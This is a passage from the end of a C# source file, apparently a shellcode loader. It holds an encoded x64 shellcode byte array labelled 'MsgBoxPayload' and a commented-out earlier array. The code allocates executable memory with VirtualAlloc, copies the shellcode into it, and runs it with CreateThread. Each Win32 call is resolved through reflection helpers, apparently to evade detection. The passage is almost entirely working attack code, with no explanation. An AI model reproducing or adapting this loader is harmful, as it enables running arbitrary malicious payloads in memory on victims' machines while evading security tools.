            0x85,0x5c,0x7b,0xd8,0x9b,0x18,0xcd,0x8d,0x7a,0x48,0x29,0xcd,
            0x85,0xca,0x27,0x0c,0x85,0xcd,0x0b,0xb0,0x25,0x72,0xed,0x47};
            */

            //MsgBoxPayload
            byte[] shellcodeBytes = { 0x48,0x31,0xc9,0x48,0x81,0xe9,
            0x64,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,0xff,0xff,0x48,
            0xbb,0xe9,0x37,0xd9,0xc2,0x51,0x3c,0xd4,0x67,0x48,0x31,0x58,
            0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xa1,0x06,0x10,
            0x8a,0xd0,0xd5,0xbd,0x98,0x16,0xc8,0x91,0x4f,0x54,0xd3,0x2b,
            0x98,0x16,0x7f,0x62,0x8c,0xa3,0xef,0x44,0xcd,0x83,0x5a,0xeb,
            0x8a,0x60,0x64,0xf3,0x2f,0xc4,0xcf,0x26,0x3d,0xae,0xde,0x20,
            0x61,0x2a,0x2d,0x01,0xe9,0xd2,0x3f,0x19,0xd6,0xe4,0xac,0xc4,
            0x6d,0xd4,0xae,0x19,0xd6,0x53,0x5f,0xba,0xe5,0x38,0x89,0x6b,
            0x42,0x24,0x40,0x01,0x59,0x63,0x76,0xae,0x04,0xe3,0x1b,0xb6,
            0x97,0xd9,0xa5,0x5d,0x95,0xd1,0x74,0x45,0xea,0x77,0x0a,0xea,
            0x5b,0x50,0xb1,0xc1,0xec,0xfb,0x0a,0xea,0xec,0xa3,0x3f,0xc1,
            0xfe,0xfc,0x59,0xfb,0xbe,0x24,0x74,0xf5,0x5b,0x23,0xbd,0x38,
            0x5c,0xe7,0xc3,0x3b,0xe1,0xf0,0xbe,0x21,0x90,0xa8,0x11,0xc3,
            0x61,0xc7,0x09,0xef,0x11,0x6d,0x95,0xc5,0xe6,0xc7,0x09,0x58,
            0xe2,0x32,0xd4,0xa8,0x3c,0x24,0x81,0x3b,0x5c,0xa8,0xa1,0x72,
            0x3e,0x70,0xdb,0xe8,0xa6,0x1f,0x6f,0xc8,0xed,0xa2,0x83,0x5b,
            0x34,0x7d,0x0e,0x7c,0xe3,0x15,0x4d,0xda,0xf1,0xf9,0x08,0xfe,
            0xe3,0x15,0xfa,0x29,0x54,0x48,0x0d,0x27,0x36,0x0b,0x67,0xb9,
            0x34,0xcd,0xbf,0x26,0x54,0xc7,0x4a,0x6d,0x83,0x03,0x05,0xf5,
            0x7c,0x6f,0x91,0xfc,0xd7,0xf4,0xb0,0xd5,0xcb,0xa1,0x10,0x39,
            0x53,0xf2,0xcd,0xd5,0xcb,0x16,0xe3,0x63,0xae,0x01,0xf8,0x8e,
            0xd7,0xd9,0x94,0xfc,0x67,0x45,0x15,0x62,0x19,0xa6,0xa7,0x4b,
            0xa9,0xff,0xc6,0xb5,0xfd,0x8b,0xda,0x91,0x5c,0x1d,0x01,0x02,
            0x33,0x0a,0x1f,0x15,0x5a,0x65,0x01,0x02,0x84,0xf9,0xe4,0x1d,
            0x1d,0x3e,0x83,0x3f,0x6c,0x16,0xda,0x21,0xed,0xbd,0xb6,0xd0,
            0x34,0xbd,0x6d,0xef,0x57,0x6e,0xc0,0xc1,0xad,0xae,0x6e,0x3b,
            0x99,0x31,0x77,0x0f,0x2c,0x6b,0xea,0x3d,0xea,0x31,0x77,0xb8,
            0xdf,0x63,0xde,0x2c,0xd7,0x8d,0x27,0x1c,0xe4,0xae,0xde,0x8a,
            0x32,0x86,0xa5,0x08,0x9b,0x19,0x10,0x30,0xe1,0x03,0x88,0xc7,
            0xee,0x24,0xa9,0xaf,0x6a,0xb4,0x46,0x46,0x2b,0xa0,0xaf,0xc1,
            0x6a,0xb4,0xf1,0xb5,0x2e,0x8c,0x81,0x5a,0x15,0x43,0xdd,0xa1,
            0xee,0x94,0x18,0x19,0xdd,0x66,0x41,0xf1,0x59,0x5a,0xa2,0xca,
            0x55,0x53,0xb1,0x22,0xa7,0x44,0xb2,0x6e,0xe2,0x9d,0x30,0xe7,
            0x23,0x42,0xdb,0x6e,0xe2,0x2a,0xc3,0x43,0xbe,0x79,0x87,0x15,
            0x84,0x15,0xbc,0x22,0x17,0xf5,0x03,0xd9,0x30,0x9a,0x87,0x95,
            0xd9,0x4f,0xd0,0xf0,0xb4,0x7f,0x93,0x6f,0x56,0x41,0x1f,0x47,
            0x7a,0xfe,0x56,0xeb,0x50,0x25,0x1f,0x47,0xcd,0x0d,0x82,0xfa,
            0xc5,0x6e,0xc2,0x1b,0x6a,0x80,0x93,0xdf,0xe7,0xfd,0xa8,0x95,
            0x7d,0x49,0x24,0x11,0x5d,0x2e,0xf1,0x9d,0x36,0x4a,0x78,0xa4,
            0xf0,0x13,0x46,0x53,0xb7,0x8f,0xfc,0xa2,0xaf,0x13,0x46,0xe4,
            0x44,0x83,0x6f,0x38,0x5c,0x5e,0xbc,0x94,0xf0,0x4a,0xc8,0x15,
            0x77,0xa4,0x94,0x54,0x00,0xfd,0x06,0xaf,0xa4,0x25,0x1e,0x10,
            0xbb,0x31,0x15,0xd0,0xa0,0x92,0xd0,0x91,0x7e,0xb5,0x13,0x8a,
            0xa0,0x92,0x67,0x62,0x00,0xd6,0xb6,0xd7,0xce,0x7e,0x2a,0xec,
            0xbb,0x81,0xa4,0x52,0x17,0x40,0xd7,0x26,0x0c,0x4f,0x1e,0x81,
            0xe4,0x3a,0xac,0x33,0xe3,0x4a,0x53,0xbf,0x53,0xf4,0x2d,0xf6,
            0x67,0x4c,0x06,0xbf,0x53,0x43,0xde,0xde,0x80,0x45,0xf2,0x3c,
            0x85,0x1f,0xb2,0x33,0x53,0xfb,0xde,0x08,0x81,0xf3,0x9a,0x84,
            0x9d,0x41,0x0d,0xad,0x7f,0x24,0x26,0x86,0xa2,0x18,0xd1,0x1a,
            0xb1,0xa5,0xe3,0x02,0xa4,0x48,0xd1,0x1a,0x06,0x56,0xb9,0xd4,
            0x25,0xfd,0x6a,0x19,0x09,0x1e,0x26,0x36,0x13,0x90,0x66,0xc8,
            0xb6,0x12,0x91,0xf8,0xa9,0x43,0xb1,0x07,0xe9,0xef,0xab,0x12,
            0xb8,0xbb,0x06,0xc9,0x68,0x2a,0x2f,0x14,0xf3,0xbb,0x06,0x7e,
            0x9b,0x51,0x8d,0x88,0xf5,0x5b,0xec,0xf5,0x09,0xef,0x1b,0xa3,
            0x2b,0x0c,0xd4,0xce,0xdf,0x58,0xd5,0x19,0xf8,0xfa,0x6f,0x8c,
            0x91,0x39,0xd6,0x81,0xda,0x4d,0xa1,0x0d,0x54,0xbd,0xd0,0xc7,
            0xda,0x4d,0x16,0xfe,0xb6,0x90,0x37,0x27,0x20,0x7c,0xa3,0xf7,
            0x91,0x89,0x67,0x1f,0x6d,0x9f,0xa6,0xba,0x26,0x47,0xdd,0xcc,
            0x02,0xab,0x9f,0x12,0x5d,0x9f,0x7c,0x75,0xb5,0x65,0x1e,0xd7,
            0xd9,0x99,0x3d,0x75,0xb5,0xd2,0xed,0xe4,0x1b,0xc8,0x36,0x83,
            0xf4,0xa5,0x24,0x12,0xed,0x2e,0xe5,0xc2,0x67,0x62,0xa9,0xa5,
            0x23,0x94,0x36,0x7c,0xbc,0xed,0xea,0xd2,0x8b,0x8a,0x4f,0xcb,
            0x72,0x6c,0x2f,0x56,0x8d,0xb6,0x4f,0xcb,0xc5,0x9f,0xde,0xc5,
            0x28,0x2e,0x76,0x65,0xc2,0xc9,0xea,0x62,0x3a,0x6e,0xf8,0x19,
            0x75,0xdb,0x5d,0xac,0x80,0xbd,0x84,0x93,0x0e,0x0b,0xe5,0xeb,
            0xe5,0x5b,0x33,0x5d,0x8f,0xce,0x61,0xed,0xd2,0x5b,0x33,0xea,
            0x7c,0xaa,0x08,0x1f,0x3d,0x3e,0x1c,0x8a,0x09,0x0b,0x55,0x5a,
            0x0a,0xec,0xe1,0x5a,0x38,0xbc,0x9b,0xe0,0xd9,0x05,0x91,0x76,
            0x9f,0x58,0x5d,0xe7,0x1c,0xb2,0x5f,0xf7,0x5a,0xdc,0x5b,0xd5,
            0x1c,0xb2,0xe8,0x04,0x13,0xa2,0x17,0xed,0x00,0x4f,0x5f,0x76,
            0x9f,0xe8,0xec,0x0d,0xab,0x60,0x58,0x40,0x28,0x26,0x56,0xde,
            0x6f,0x07,0xca,0x30,0xb5,0x32,0x99,0x1c,0xd8,0xc9,0x4b,0xf5,
            0x31,0x34,0xb4,0x1c,0xd8,0x7e,0xb8,0x95,0xee,0xce,0x13,0x64,
            0x03,0x27,0x4b,0x30,0x05,0x83,0x6c,0xab,0x0a,0xce,0xfc,0x87,
            0xcb,0x39,0xbf,0x46,0xcc,0xea,0x13,0x7e,0xf9,0x1d,0xfc,0xf1,
            0x02,0x6b,0xd6,0xfa,0xff,0x35,0xfc,0xf1,0xb5,0x98,0x8c,0x82,
            0x46,0x6a,0xaa,0xc7,0x72,0xab,0x13,0xce,0x48,0xed,0x4b,0x23,
            0x05,0xdc,0xa4,0x00,0xf2,0x3e,0x9c,0x42,0x62,0xcb,0x73,0xdf,
            0x43,0xbd,0x2b,0x8c,0xe3,0x0e,0xf7,0xd9,0x60,0xbd,0x2b,0x3b,
            0x10,0x1f,0xfe,0xcc,0xeb,0xde,0xed,0x0d,0x51,0xcb,0xc3,0x6e,
            0xb8,0x0a,0xf9,0x8b,0x54,0x7c,0x0d,0xd4,0x6b,0x22,0x90,0x08,
            0x3b,0xef,0x34,0xb7,0x9a,0x36,0x08,0x89,0xdf,0x1f,0x8a,0x19,
            0x24,0x8e,0x8a,0xd8,0x89,0x57,0xfa,0x9a,0x00,0x96,0x53,0xdb,
            0xbf,0x21,0x83,0xc3,0x37,0xc6,0xe6,0xc1,0x54,0x4d,0xeb,0x76,
            0x2d,0x55,0xaa,0xd9,0xe1,0x57,0xc4,0xff,0x2f,0x94,0x95,0xb8,
            0x16,0x57,0xfa,0x88,0xc9,0xe2,0xb9,0xf5,0xdd,0x33,0xeb,0x09,
            0xa4,0x17,0xd5,0xc8,0xde,0xde,0x29,0xa5,0x37,0x9f,0x89,0xb7,
            0x97,0x94,0x99,0x68,0x5b,0x55,0x9a,0xb5,0x97,0x1e,0x1b,0x76,
            0xee,0x5e,0x50,0x89,0xdf,0x1f,0x83,0xcd,0xa5,0xaa,0xb7,0xc1,
            0xde,0xcf,0x9b,0x76,0xee,0x96,0xc0,0xb7,0x9b,0x94,0x8b,0x68,
            0x2c,0xdf,0x08,0x6a,0x83,0x57,0x34,0x81,0x5b,0x9f,0x53,0xbd,
            0x57,0x57,0xca,0x9e,0x28,0xef,0x11,0xc1,0xee,0xdf,0x67,0x09,
            0xa4,0x17,0xd5,0xc8,0xde,0xde,0xf3,0xa8,0x10,0x2f,0xe6,0xc5,
            0xdc,0x53,0xef,0x40,0x20,0xe7,0x09,0xfc,0x09,0x47,0xf5,0x0c,
            0xee,0x9e,0xfc,0xc0,0xde,0xcf,0xad,0x76,0x24,0x55,0xd4,0xc1,
            0xe1,0x5b,0x40,0x08,0x79,0x97,0xd9,0x59,0xe1,0x5e,0x40,0x4c,
            0xed,0x96,0xd9,0x59,0x9e,0x47,0x8a,0x10,0x3b,0x87,0x82,0xc8,
            0x87,0x5e,0x92,0x09,0x3f,0x96,0x5b,0x65,0xff,0x5e,0x99,0xb7,
            0x85,0x86,0x99,0xd0,0x85,0x21,0x83,0xc3,0x77,0x37,0x91,0x76,
            0x20,0xe0,0x96,0x01,0xa2,0x1f,0xd8,0x89,0xdf,0x1f,0xf5,0x00,
            0xe8,0x4b,0x26,0x89,0xdf,0x1f,0xf5,0x04,0xe8,0x5b,0xde,0x88,
            0xdf,0x1f,0x83,0x79,0xac,0x9f,0x62,0xcc,0x5c,0x49,0xcc,0xb7,
            0xb0,0x96,0xe9,0x40,0x9e,0xa5,0x3b,0xfd,0xc7,0x88,0x27,0x5c,
            0x99,0x6a,0xa8,0x23,0x3c,0xb1,0xad,0x89,0x92,0x7a,0xb8,0x3b,
            0x04,0xb9,0xbd,0xcb,0xb0,0x67,0xcb,0x48,0x65,0x42,0x03,0xe3,
            0xe3,0xa4,0xb0,0x8a,0x25,0x44,0x2e,0x40,0x5f,0xec,0xe0,0x91,
            0x95,0xce,0xfe,0x2a,0x1c,0x38,0xf5,0xe6,0x67};

            var ShellCodeAddr = ExecFunctionWithReflection4("kernel32.dll", "VirtualAlloc", IntPtr.Zero, (uint)shellcodeBytes.Length, 0x1000, 0x40, IntPtr.Zero);
            Console.WriteLine(ShellCodeAddr);

            Marshal.Copy(shellcodeBytes, 0, (IntPtr)ShellCodeAddr, shellcodeBytes.Length);



            var handleforshell = ExecFunctionWithReflection6("kernel32.dll", "CreateThread", IntPtr.Zero, 0, (IntPtr)ShellCodeAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine(handleforshell);

            UInt32 po = 141;
            ExecFunctionWithReflection2("kernel32.dll", "WaitForSingleObject", (IntPtr)handleforshell, 0xFFFFFFFF, po);



    }
    }
    }
